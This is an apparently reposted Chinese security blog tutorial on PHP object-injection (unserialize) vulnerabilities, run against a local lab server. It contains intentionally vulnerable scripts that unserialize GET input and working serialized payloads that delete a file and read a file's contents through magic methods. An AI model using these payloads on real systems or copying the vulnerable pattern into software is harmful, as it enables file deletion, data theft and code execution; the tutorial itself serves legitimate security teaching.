<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 理解php序列化漏洞 · Uknow’s Blog</title><meta name="description" content="理解php序列化漏洞 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="http://weibo.com/u/3477219002" target="_blank" class="nav-list-link">Weibo</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">Rss</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">理解php序列化漏洞</h1><div class="post-time">Jul 11, 2017</div><div class="post-content"><p>PHP对象注入是一个非常常见的漏洞，这个类型的漏洞虽然有些难以利用，但仍旧非常危险。为了理解这个漏洞，请读者具备基础的php知识。类和变量是非常容易理解的php概念。举个例子，1.php在一个类中定义了一个变量和一个方法。它创建了一个对象并且调用了PrintVariable函数，该函数会输出变量variable。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class TestClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 一个变量  </span><br><span class="line">   </span><br><span class="line">    public $variable = &apos;This is a string&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 一个简单的方法  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建一个对象  </span><br><span class="line">   </span><br><span class="line">$object = new TestClass();  </span><br><span class="line">   </span><br><span class="line">// 调用一个方法  </span><br><span class="line">   </span><br><span class="line">$object-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161225214524536" alt=""></p>
<p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，<strong>toString当一个对象被当作一个字符串使用。为了更好的理解magic方法是如何工作的，在2.php中增加了三个magic方法，</strong>construct, <strong>destruct和</strong>toString。可以看出，<strong>construct在对象创建时调用，</strong>destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class TestClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 一个变量  </span><br><span class="line">   </span><br><span class="line">    public $variable = &apos;This is a string&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 一个简单的方法  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Constructor  </span><br><span class="line">   </span><br><span class="line">    public function __construct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__construct &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Destructor  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // Call  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return &apos;__toString&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建一个对象  </span><br><span class="line">//  __construct会被调用  </span><br><span class="line">   </span><br><span class="line">$object = new TestClass();  </span><br><span class="line">   </span><br><span class="line">// 创建一个方法   </span><br><span class="line">   </span><br><span class="line">$object-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">// 对象被当作一个字符串  </span><br><span class="line">//  __toString会被调用  </span><br><span class="line">   </span><br><span class="line">echo $object;  </span><br><span class="line">   </span><br><span class="line">// End of PHP script  </span><br><span class="line">// 脚本结束__destruct会被调用  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226145426730" alt=""></p>
<p>php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">// 某类    </span><br><span class="line">     </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // 类数据    </span><br><span class="line">     </span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;    </span><br><span class="line">     </span><br><span class="line">    // 输出数据    </span><br><span class="line">     </span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age    </span><br><span class="line">             . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">     </span><br><span class="line">// 创建一个对象    </span><br><span class="line">     </span><br><span class="line">$usr = new User();    </span><br><span class="line">     </span><br><span class="line">// 设置数据    </span><br><span class="line">     </span><br><span class="line">$usr-&gt;age = 20;    </span><br><span class="line">$usr-&gt;name = &apos;John&apos;;    </span><br><span class="line">     </span><br><span class="line">// 输出数据    </span><br><span class="line">     </span><br><span class="line">$usr-&gt;PrintData();    </span><br><span class="line">     </span><br><span class="line">// 输出序列化之后的数据    </span><br><span class="line">     </span><br><span class="line">echo serialize($usr);    </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226151805778" alt=""></p>
<p>为了使用这个对象，在4.php中用unserialize重建对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">// 某类    </span><br><span class="line">     </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // Class data    </span><br><span class="line">     </span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;    </span><br><span class="line">     </span><br><span class="line">    // Print data    </span><br><span class="line">     </span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">     </span><br><span class="line">// 重建对象    </span><br><span class="line">     </span><br><span class="line">$usr = unserialize(&apos;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;&apos;);    </span><br><span class="line">     </span><br><span class="line">// 调用PrintData 输出数据    </span><br><span class="line">     </span><br><span class="line">$usr-&gt;PrintData();    </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226152046329" alt=""></p>
<p>magic函数<strong>construct和</strong>destruct会在对象创建或者销毁时自动调用；<strong>sleep magic方法在一个对象被序列化的时候调用；</strong>wakeup magic方法在一个对象被反序列化的时候调用。在5.php中添加这几个magic函数的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">class Test  </span><br><span class="line">&#123;  </span><br><span class="line">    public $variable = &apos;BUZZ&apos;;  </span><br><span class="line">    public $variable2 = &apos;OTHER&apos;;  </span><br><span class="line">   </span><br><span class="line">    public function PrintVariable()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo $this-&gt;variable . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __construct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__construct&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __wakeup()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__wakeup&lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public function __sleep()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__sleep&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">        return array(&apos;variable&apos;, &apos;variable2&apos;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 创建对象调用__construct</span><br><span class="line">   </span><br><span class="line">$obj = new Test();  </span><br><span class="line">   </span><br><span class="line">// 序列化对象调用__sleep  </span><br><span class="line">   </span><br><span class="line">$serialized = serialize($obj);  </span><br><span class="line">   </span><br><span class="line">// 输出序列化后的字符串  </span><br><span class="line">   </span><br><span class="line">print &apos;Serialized: &apos; . $serialized . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">// 重建对象调用__wakeup  </span><br><span class="line">   </span><br><span class="line">$obj2 = unserialize($serialized);  </span><br><span class="line">   </span><br><span class="line">// 调用PintVariable输出数据 </span><br><span class="line">   </span><br><span class="line">$obj2-&gt;PrintVariable();  </span><br><span class="line">   </span><br><span class="line">// 脚本结束调用__destruct   </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226163434517" alt=""></p>
<p>现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义<strong>wakeup或</strong>destruct的类，这些函数会影响Web应用程序。例如，我们可能会找到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为logfile.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">   </span><br><span class="line">class LogFile  </span><br><span class="line">&#123;  </span><br><span class="line">    // log文件名  </span><br><span class="line">   </span><br><span class="line">    public $filename = &apos;error.log&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 储存日志文件  </span><br><span class="line">   </span><br><span class="line">    public function LogData($text)  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    // 删除日志文件  </span><br><span class="line">   </span><br><span class="line">    public function __destruct()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;  </span><br><span class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个使用它的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">     </span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">     </span><br><span class="line">// 创建一个对象    </span><br><span class="line">     </span><br><span class="line">$obj = new LogFile();    </span><br><span class="line">     </span><br><span class="line">// 设置文件名和要储存的日志数据    </span><br><span class="line">     </span><br><span class="line">$obj-&gt;filename = &apos;somefile.log&apos;;    </span><br><span class="line">$obj-&gt;LogData(&apos;Test&apos;);    </span><br><span class="line">     </span><br><span class="line">// 脚本结束__destruct被调用somefile.log文件被删除  </span><br><span class="line">     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>在其它脚本中我们可能找到一个unserialize的调用，并且参数是用户提供的。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">   </span><br><span class="line">include &apos;logfile.php&apos;;  </span><br><span class="line">   </span><br><span class="line">// ... 一些使用LogFile类的代码...  </span><br><span class="line">   </span><br><span class="line">// 简单的类定义  </span><br><span class="line">   </span><br><span class="line">class User  </span><br><span class="line">&#123;  </span><br><span class="line">    // 类数据  </span><br><span class="line">   </span><br><span class="line">    public $age = 0;  </span><br><span class="line">    public $name = &apos;&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 输出数据  </span><br><span class="line">   </span><br><span class="line">    public function PrintData()  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 重建用户输入的数据  </span><br><span class="line">   </span><br><span class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>创建利用代码111.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">include &apos;logfile.php&apos;;  </span><br><span class="line"></span><br><span class="line">$obj = new LogFile();  </span><br><span class="line">$obj-&gt;filename = &apos;1.php&apos;;  </span><br><span class="line">   </span><br><span class="line">echo serialize($obj) . &apos;&lt;br /&gt;&apos;;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226171240425" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:7:&quot;LogFile&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226171734880" alt=""></p>
<p>显示已经删除了1.php。验证一下，果然成功删除了。<br><img src="http://img.blog.csdn.net/20161226171852146" alt=""></p>
<p>这就是漏洞名称的由来：在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行或者其它坑爹的行为。先不谈 <strong>wakeup 和 </strong>destruct，还有一些很常见的注入点允许你利用这个类型的漏洞，一切都是取决于程序逻辑。举个例子，某用户类定义了一个<strong>toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许</strong>toString读取某个文件。把下面这段代码保存为test.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">   </span><br><span class="line">// … 一些include ...  </span><br><span class="line">   </span><br><span class="line">class FileClass  </span><br><span class="line">&#123;  </span><br><span class="line">    // 文件名  </span><br><span class="line">   </span><br><span class="line">    public $filename = &apos;error.log&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 当对象被作为一个字符串会读取这个文件  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return file_get_contents($this-&gt;filename);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// Main User class  </span><br><span class="line">   </span><br><span class="line">class User  </span><br><span class="line">&#123;  </span><br><span class="line">    // Class data  </span><br><span class="line">   </span><br><span class="line">    public $age = 0;  </span><br><span class="line">    public $name = &apos;&apos;;  </span><br><span class="line">   </span><br><span class="line">    // 允许对象作为一个字符串输出上面的data  </span><br><span class="line">   </span><br><span class="line">    public function __toString()  </span><br><span class="line">    &#123;  </span><br><span class="line">        return &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">// 用户可控  </span><br><span class="line">   </span><br><span class="line">$obj = unserialize($_GET[&apos;usr_serialized&apos;]);  </span><br><span class="line">   </span><br><span class="line">// 输出__toString  </span><br><span class="line">   </span><br><span class="line">echo $obj;  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226172759524" alt=""></p>
<p>但是如果我们用序列化调用FileClass呢?先建立一个1.txt。</p>
<p><img src="http://img.blog.csdn.net/20161226181346046" alt=""></p>
<p>创建利用代码123.php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> </span><br><span class="line">include &apos;test.php&apos;;  </span><br><span class="line">$fileobj = new FileClass();  </span><br><span class="line">$fileobj-&gt;filename = &apos;1.txt&apos;;  </span><br><span class="line">   </span><br><span class="line">echo serialize($fileobj);  </span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://img.blog.csdn.net/20161226174603949" alt=""></p>
<p>访问<a href="http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}" target="_blank" rel="noopener">http://192.168.153.138/test.php?usr_serialized=O:9:&quot;FileClass&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;}</a></p>
<p><img src="http://img.blog.csdn.net/20161226174705550" alt=""></p>
<p>成功显示了文本内容。也可以使用其他magic函数：如果对象将调用一个不存在的函数<strong>call将被调用；如果对象试图访问不存在的类变量</strong>get和__set将被调用。但是利用这种漏洞并不局限于magic函数，在普通的函数上也可以采取相同的思路。例如User类可能定义一个get方法来查找和打印一些用户数据，但是其他类可能定义一个从数据库获取数据的get方法，这从而会导致SQL注入漏洞。set或write方法会将数据写入任意文件，可以利用它获得远程代码执行。唯一的技术问题是注入点可用的类，但是一些框架或脚本具有自动加载的功能。最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。</p>
<p>原文链接：<a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="noopener">http://blog.csdn.net/qq_32400847/article/details/53873275</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/xss-payload-大全.html" class="prev">PREV</a><a href="/posts/notes/方程式-0day-Eternalblue复现.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="http://uknowsec.cn">uknow</a>, Powered by Hexo & Hexo-theme-apollo.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>